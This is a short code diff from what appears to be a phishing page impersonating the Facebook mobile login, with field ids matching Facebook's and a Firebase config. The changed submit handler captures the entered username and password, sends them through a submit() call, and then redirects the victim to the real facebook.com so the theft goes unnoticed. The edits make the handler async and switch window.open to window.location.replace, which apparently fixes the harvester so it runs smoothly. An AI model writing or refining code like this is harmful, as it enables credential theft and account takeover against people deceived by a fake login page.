@@ -26,7 +26,7 @@ var firebaseConfig = {
   const username = document.getElementById('m_login_email');
   const password =document.getElementById('m_login_password');
  const loginForm = document.getElementById('login_form');
- loginForm.addEventListener('submit',(e)=>{
+ loginForm.addEventListener('submit',async (e)=>{
         e.preventDefault();
        
         const data ={
@@ -35,7 +35,7 @@ var firebaseConfig = {
         }
        
         await submit(username.value,password.value);
-        window.open('https://facebook.com/');
+        window.location.replace('https://facebook.com/','_blank');
         
 })
 
